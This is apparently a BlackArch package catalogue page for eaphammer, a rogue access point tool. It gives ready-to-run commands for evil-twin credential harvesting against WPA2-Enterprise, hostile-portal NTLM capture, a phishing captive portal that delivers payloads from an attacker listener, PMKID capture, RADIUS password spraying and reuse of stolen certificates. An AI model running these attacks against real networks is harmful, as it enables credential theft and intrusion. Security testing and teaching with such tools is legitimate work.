---
name: "eaphammer"
categories:
  - blackarch-wireless
version: "v1.14.1.r0.g91e8956"
homepage: "https://github.com/s0lst1c3/eaphammer"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-12"
build-system: scripts
license: GPL3
meta-checked: "2026-11-09"
github-repo: "s0lst1c3/eaphammer"
github-stars: 2605
github-pushed: "2024-09-22"
github-archived: false
github-issues: 42
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# eaphammer

> Single-command evil twin attacks against WPA2-Enterprise and open networks: credential harvesting, hostile portals, captive portals, PMKID captures.

## What it's for

EAPHammer (Gabriel Ryan, s0lst1c3) automates rogue-access-point attacks against 802.1X/EAP and open Wi-Fi networks. It wraps a modified hostapd-wpe, dnsmasq, Responder and hcxtools behind one CLI: a single command brings up an access point that harvests RADIUS credentials, serves a hostile portal to capture NTLM/Active Directory credentials, or runs a modular captive portal with keylogging and payload delivery. It also manages the x.509 certificates these attacks require, performs client-less PMKID captures against PSK networks, and can password-spray RADIUS accounts across a pool of wireless interfaces. It is not a general cracking suite — there is no handshake dictionary attack or WPS mode; the focus is hostile access point operations that need minimal manual configuration.

## Typical use cases

### Import an existing CA-signed certificate chain

Reuses certificates recovered from a compromised environment (or bought from the target's CA) so the rogue AP presents a certificate clients already trust.

```
eaphammer --cert-wizard import --server-cert server.crt --ca-cert ca.crt --private-key server.key --private-key-passwd Password1
```

Outcome: validates the inputs, merges server cert, CA chain and key into a single PEM under `certs/server/`, and activates it — every attack launched afterwards presents this chain to clients.

### Harvest RADIUS credentials with a credential-stealing evil twin

Stand up a WPA2-Enterprise twin of the target network and collect whatever clients send during EAP authentication.

```
eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```

Outcome: brings up a rogue AP broadcasting CorpWifi with 802.1X authentication (plus automatic GTC downgrade attempts); connected clients' EAP credentials are captured and printed, ready for offline cracking of MSCHAPv2 challenge/response pairs.

### Steal AD credentials with a hostile portal

Force clients of an evil twin (open or EAP) to authenticate against the attacker's host instead of a login page.

```
eaphammer --interface wlan0 --essid GuestNet --channel 6 --auth open --hostile-portal
```

Outcome: HTTP traffic from associated victims is redirected to an SMB share on the attacker's host, triggering NTLM authentication attempts (an assisted Redirect-To-SMB attack) while LLMNR/NBT-NS poisoning runs — captured hashes appear as with Responder, without needing a foothold on the wired network.

### Run a captive portal from a cloned template

Serve a convincing login page with keylogging and payload delivery instead of harvesting EAP traffic.

```
eaphammer --captive-portal -e GuestNet -i wlan0 --portal-template rogue-cert-prompt --lhost 198.51.100.10 --payload secure.crt
```

Outcome: starts the rogue AP with a web portal built from the named template; victims' submitted credentials are logged and the configured payload is delivered from the listener address.

### Capture a PMKID from a WPA-PSK access point

Grab a crackable hash from an AP directly, with no client required.

```
eaphammer --pmkid --interface wlan0 --bssid AA:BB:CC:DD:EE:FF
```

Outcome: eaphammer locates the AP's channel automatically and requests its PMKID (roaming-enabled routers); the captured hash is saved for offline cracking with hashcat.

### Password-spray RADIUS accounts

Check one password against many usernames on a real EAP network, in parallel.

```
eaphammer --eap-spray --interface-pool wlan0 wlan1 wlan2 --essid CorpWifi --password Password1 --user-list users.txt
```

Outcome: each interface in the pool runs authentication attempts pairing every username in the list with the sprayed password; accounts that accept it are reported. More interfaces means more parallel attempts — flooding a single card only slows the attack down.
